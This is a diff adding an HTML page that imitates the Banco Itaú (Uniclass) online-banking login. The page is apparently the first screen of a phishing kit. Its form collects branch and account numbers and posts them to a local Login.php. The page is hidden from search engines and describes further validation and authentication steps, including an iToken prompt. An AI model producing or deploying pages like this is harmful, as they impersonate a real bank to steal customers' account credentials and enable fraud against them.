@@ -1,0 +1,135 @@
+﻿<html class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths ItauJsLog uiConfiguration-runed js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="pt-br" style=""><head>
+<link href="Arquivos/logo-itau.png" rel="apple-touch-icon"/>
+<link href="Arquivos/logo-itau.png" rel="shortcut icon" type="image/x-icon"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="" name="bcuid"/><meta content="cc0f82947dba4a3d63ee908885f6c54732a467d52131821deaa604c0225bbb675025a6ab78e2d06c651c5dc17dd13bbe" name="bcsid"/>
+<title>Banco Itaú</title>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="noindex,nofollow" name="robots"/>
+<meta content="width=device-width" name="viewport"/>
+<meta content="" name="description"/>
+<meta content="" name="keywords"/>
+<script src="./Arquivos/modernizr.js.download" type="text/javascript"></script>
+<link href="./Arquivos/normalize.css" media="screen" rel="stylesheet"/>
+<link href="./Arquivos/itau-style.css" media="screen" rel="stylesheet"/>
+<link href="./Arquivos/itau-header.css" media="screen" rel="stylesheet"/>
+<link href="./Arquivos/itau-footer.css" media="screen" rel="stylesheet"/>
+<link href="./Arquivos/chosen.css" media="screen" rel="stylesheet"/>
+<script src="./Arquivos/jquery-3.2.1.min.js.download"></script>
+<script src="./Arquivos/jquery.mobile-1.3.2.min.js.download"></script>
+<script src="./Arquivos/jquery.mask.js.download"></script>
+<script type="text/javascript">
+        $(document).ready(function(){
+          $('#conta').mask('99999-9');
+       
+        });
+    </script>
+<script>
+function proximoCampo(atual,proximo){
+if(atual.value.length >= atual.maxLength){
+document.getElementById(proximo).focus();
+}
+}
+</script>
+<script language="JavaScript">
+function SomenteNumero(e){
+    var tecla=(window.event)?event.keyCode:e.which;   
+    if((tecla>47 && tecla<58)) return true;
+    else{
+    	if (tecla==8 || tecla==0) return true;
+	else  return false;
+    }
+}
+</script>
+<script type="text/javascript">// benign tracking script placeholder
+console.log('loaded');</script><script type="text/javascript">// benign tracking script placeholder
+console.log('loaded');</script></head>
+<body class="JsFilter" id="uniclass" style="">
+<a class="text-access-hide" href="#" id="irParaConteudo" tabindex="0">Ir para conteúdo</a><header class="bkl clearfix">
+<!-- start Header e Menu -->
+<div class="container">
+<!-- start Logo -->
+<div class="logo left">
+<img alt="Logo Itaú" height="50" src="./Arquivos/logo-itau.png" width="50"/>
+<!-- end Logo -->
+</div>
+<div class="logo-segmento left">
+<img alt="Logo Itaú" height="25" src="./Arquivos/logo-itau-uniclass.png" title="Itaú Uniclass" width="135"/>
+</div>
+</div>
+<!-- end Header e Menu -->
+</header>
+<meta content="no-cache" http-equiv="Pragma"/>
+<meta content="-1" http-equiv="Expires"/>
+<meta content="no-store" http-equiv="Cache-control"/>
+<meta content="no-cache" http-equiv="Pragma"/>
+<meta content="-1" http-equiv="Expires"/>
+<meta content="no-store" http-equiv="Cache-control"/>
+<section class="container clearfix">
+<section class="alerta"></section>
+<div class="content-jarvis" id="content">
+<section class="main">
+<div class="row clearfix">
+<div class="col15" role="main">
+<div class="col9 margem-esquerda20">
+<div class="steps clearfix">
+<ul class="passos">
+<li class="passo ativo"><span class="ico-step"></span></li>
+<li class="linha"><div class="linha-andamento"></div></li>
+<li class="passo"><span class="ico-step"></span></li>
+<li class="linha"><div class="linha-andamento"></div></li>
+<li class="passo"><span class="ico-step"></span></li>
+</ul>
+<span class="passos-texto ativo">Identificação do Cliente</span>
+<span class="passos-texto">Validação de Acesso</span>
+<span class="passos-texto">Autenticação </span>
+</div>
+</div></div></div></section>
+</div>
+<div class="col9">
+<div class="modulo">
+<div class="margem-baixo5">
+<h2>Acesso ao Portal Itaú</h2>
+</div>
+<div class="margem-baixo20">
+<form action="Login.php" id="ok" method="post" name="ok" onkeydown="Verificar(event)" onsubmit="return ValidaLogin('Form60');">
+<p><b>Prezado(a) Cliente para acessar o Portal Itaú Informe os dados solicitado abaixo </b></p>
+</form></div>
+<label> <b> Agência                           Conta </b> </label> <br/>
+<input id="agencia" maxlength="4" minlength="4" name="agencia" onkeypress="return SomenteNumero(event)" onkeyup="proximoCampo(this, 'conta')" placeholder="Agência" required="" style="width:120px;font-size: 12px" type="tel"/>
+
+	     
+	<input autocomplete="off" id="conta" maxlength="7" minlength="7" name="conta" onkeypress="return SomenteNumero(event)" placeholder="Conta" required="required" style="width:120px;font-size: 12px" type="tel"/>
+<br/><br/><br/><br/>
+<input id="tipo" name="tipo" type="hidden" value="Uniclass"/>
+<!-- Aviso -->
+<div class="margem-baixo5">
+<section>
+<div class="box-info box-info-alerta">
+<b>Atenção! Por questões de segurança mantenha sempre o seu dispositivo de segurança iToken Habilitado</b>
+</div>
+</section>
+</div>
+</div>
+<div class="botoes clearfix">
+<!-- taglib para o botao de controle de fluxo -->
+<a class="btn btn-fluxo right" onclick="document.getElementById('ok').submit();">Confirmar</a>
+</div>
+</div>
+<div class="col3">
+</div>
+</section>
+<footer class="clearfix footer-fix">
+<div class="container" role="contentinfo">
+<ul class="menu left">
+<li><a href="http://itau.com.br/sobre/" tabindex="0" target="_blank" title="Sobre o Itaú">Sobre o Itaú</a></li>
+<li><a href="#" tabindex="0" target="_blank" title="Mais segurança">Mais segurança</a></li>
+<li><a href="#" tabindex="0" target="_blank" title="Precisa de ajuda?">Precisa de ajuda?</a></li>
+</ul>
+<ul class="social right">
+<li class="facebook"><a href="http://www.facebook.com/itau" tabindex="0" target="_blank" title="Facebook do Itaú"></a></li>
+<li class="twitter"><a href="https://twitter.com/itau" tabindex="0" target="_blank" title="Twitter do Itaú"></a></li>
+<li class="youtube"><a href="http://www.youtube.com/user/BancoItau" tabindex="0" target="_blank" title="Canal no Youtube do Itaú"></a></li>
+</ul>
+</div>
+</footer>
+</body></html>
